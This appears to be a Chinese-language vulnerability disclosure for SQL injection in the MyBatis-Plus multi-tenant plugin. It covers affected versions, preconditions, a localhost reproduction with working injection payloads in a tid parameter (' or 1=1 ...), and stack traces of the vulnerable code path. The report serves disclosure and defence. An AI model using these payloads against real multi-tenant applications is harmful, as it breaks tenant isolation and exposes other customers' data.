
# MybatisPlus多租户插件SQL注入

## 1. 漏洞总结

威胁：SQL注入

受影响的模块：多租户插件

MavenGroupId：com.baomidou

MavenArtifactId：mybatis-plus

影响版本：3.x

描述：租户插件在构造sql表达式时，没有对租户id值做处理，直接拼接到sql表达式。当应用程序启用了租户插件并且租户id是外部用户可控时，可以造成sql注入

可造成的结果：成功的 SQL 注入漏洞可以从数据库中读取敏感数据、修改数据库数据（插入/更新/删除）、对数据库执行管理操作（例如关闭 DBMS）、恢复 DBMS 文件中存在的给定文件的内容系统并在某些情况下向操作系统发出命令

漏洞利用前提条件：
1. 应用程序启用了租户插件；
2. 租户id外部可控，传入了 `getTenantId` 方法；
    - （3.0.x, 3.1.x, 3.3.x）com.baomidou.mybatisplus.extension.plugins.tenant.TenantHandler#getTenantId
    - （3.4.x, 3.5.x）com.baomidou.mybatisplus.extension.plugins.handler.TenantLineHandler#getTenantId
3. 应用程序没有对租户id值做过滤处理

修复建议：无



## 2. 漏洞复现
测试版本: 3.4.2

参考 https://github.com/baomidou/mybatis-plus-samples/tree/master/mybatis-plus-sample-tenant
搭建一个spring应用，启用多租户插件：

`com.example.demo.config.MybatisPlusConfig`
![Pasted image 20230201155305.png](./images/Pasted%20image%2020230201155305.png)

`com.example.demo.common.TenantHolder`
![Pasted image 20230201155404.png](./images/Pasted%20image%2020230201155404.png)

测试接口：`/user?tid=` 返回指定租户数据记录

`com.example.demo.controller.HelloController`
![Pasted image 20230201155458.png](./images/Pasted%20image%2020230201155458.png)

库表结构：
```text
CREATE TABLE `users` (  
  `id` int(32) NOT NULL AUTO_INCREMENT,  
  `name` varchar(32) NOT NULL,  
  `tenant_id` varchar(64) NOT NULL,  
  PRIMARY KEY (`id`)  
) ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8;
```

测试接口：

`http://localhost:8080/user?tid=`
![Pasted image 20230201155910.png](./images/Pasted%20image%2020230201155910.png)

`http://localhost:8080/user?tid=19065dc6-a14a-11ed-ba3f-864b77a22e79`
![1](./images/Pasted%20image%2020230201182920.png)

注入：`' or 1=1 and '123'='123`

`http://localhost:8080/user?tid=' or 1=1 and '123'='123`

![Pasted image 20230201155957.png](./images/Pasted%20image%2020230201155957.png)

`http://localhost:8080/user?tid=19065dc6-a14a-11ed-ba3f-864b77a22e79%27%20or%201=1%20and%20%271%27=%271`
![2](./images/Pasted%20image%2020230201182932.png)


## 3. 漏洞触发细节

测试版本：3.0.7.1

builderExpression:265, TenantSqlParser (com.baomidou.mybatisplus.extension.plugins.tenant)
processPlainSelect:193, TenantSqlParser (com.baomidou.mybatisplus.extension.plugins.tenant)
processPlainSelect:174, TenantSqlParser (com.baomidou.mybatisplus.extension.plugins.tenant)
processSelectBody:75, TenantSqlParser (com.baomidou.mybatisplus.extension.plugins.tenant)
processParser:96, AbstractJsqlParser (com.baomidou.mybatisplus.core.parser)
parser:71, AbstractJsqlParser (com.baomidou.mybatisplus.core.parser)
sqlParser:63, AbstractSqlParserHandler (com.baomidou.mybatisplus.extension.handlers)
intercept:129, PaginationInterceptor (com.baomidou.mybatisplus.extension.plugins)

![Pasted image 20230201150219.png](./images/Pasted%20image%2020230201150219.png)

测试版本：3.4.2

builderExpression:357, TenantLineInnerInterceptor (com.baomidou.mybatisplus.extension.plugins.inner)
processPlainSelect:235, TenantLineInnerInterceptor (com.baomidou.mybatisplus.extension.plugins.inner)
processSelectBody:100, TenantLineInnerInterceptor (com.baomidou.mybatisplus.extension.plugins.inner)
processSelect:88, TenantLineInnerInterceptor (com.baomidou.mybatisplus.extension.plugins.inner)
processParser:91, JsqlParserSupport (com.baomidou.mybatisplus.extension.parser)
parserSingle:50, JsqlParserSupport (com.baomidou.mybatisplus.extension.parser)
beforeQuery:70, TenantLineInnerInterceptor (com.baomidou.mybatisplus.extension.plugins.inner)
intercept:78, MybatisPlusInterceptor (com.baomidou.mybatisplus.extension.plugins)

![Pasted image 20230201154503.png](./images/Pasted%20image%2020230201154503.png)
